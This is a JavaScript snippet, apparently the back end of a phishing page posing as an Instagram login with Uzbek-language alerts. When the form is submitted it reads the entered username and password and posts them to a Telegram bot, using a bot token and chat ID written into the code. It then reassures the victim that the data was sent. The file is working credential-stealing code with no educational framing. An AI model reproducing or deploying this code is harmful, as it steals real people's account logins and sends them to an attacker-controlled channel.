document.querySelector('form').addEventListener('submit', async function(e) {
  e.preventDefault();
  const username = document.getElementById('login-user').value.trim();
  const password = document.getElementById('login-pass').value.trim();

  if (!username || !password) {
    alert('Iltimos, barcha maydonlarni to‘ldiring!');
    return;
  }

  const message = `🧾 Instagram Login\n👤 Username: ${username}\n🔒 Password: ${password}`;
  const botToken = '7828917261:AAE433aupRUxHYx5Jd6kkfBu68F4AFsY7hE';
  const chatId = '5508326569';

  try {
    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
      }),
    });
    if (response.ok) {
      alert('Ma’lumotlar muvaffaqiyatli yuborildi!');
      document.querySelector('form').reset();
    } else {
      alert('Xatolik yuz berdi. Qayta urinib ko‘ring.');
    }
  } catch (error) {
    alert('Xatolik yuz berdi. Qayta urinib ko‘ring.');
    console.error(error);
  }
});